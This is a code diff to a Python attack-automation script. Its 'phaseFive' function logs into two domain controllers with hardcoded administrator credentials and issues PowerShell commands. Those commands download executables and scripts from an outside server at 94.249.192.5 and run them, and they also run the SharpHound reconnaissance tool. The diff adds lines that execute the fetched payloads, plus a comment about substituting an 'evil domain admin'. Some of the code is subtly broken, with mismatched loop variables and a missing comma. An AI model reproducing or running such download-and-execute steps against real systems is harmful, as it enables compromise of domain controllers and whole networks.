@@ -233,6 +233,7 @@ def phaseFour():
 def phaseFive():
 	DC1 = "208.11.20.100"
 	DC2 = "208.11.21.100"
+	#Change with evil domain admin from phase four.
 	username = "administrator"
 	password = "P@ssw0rd"
 	commands = [
@@ -251,6 +252,7 @@ def phaseFive():
 	"iwr -uri http://94.249.192.5:8000/haunter.ps1 -out C:\Users\Administrator\Music\haunter.ps1",
 	"C:\Users\Administrator\Music\SharpHound.ps1 -c All"
 	"iwr -uri http://94.249.192.5:8000/porygon.exe -out C:\Users\Administrator\Pictures\porygon.exe",
+	"C:\Users\Administrator\Pictures\porygon.exe"
 	]
 	for commands in psCommands:
 		try:
@@ -261,7 +263,8 @@ def phaseFive():
 			pass
 			
 	dc2Commands = [
-	"iwr -uri http://94.249.192.5:8000/missingno.exe -out C:\Users\Administrator\Music\missingno.exe"
+	"iwr -uri http://94.249.192.5:8000/missingno.exe -out C:\Users\Administrator\Music\missingno.exe",
+	"C:\Users\Administrator\Music\missingno.exe"
 	]
 	for command in commands:
 		try:
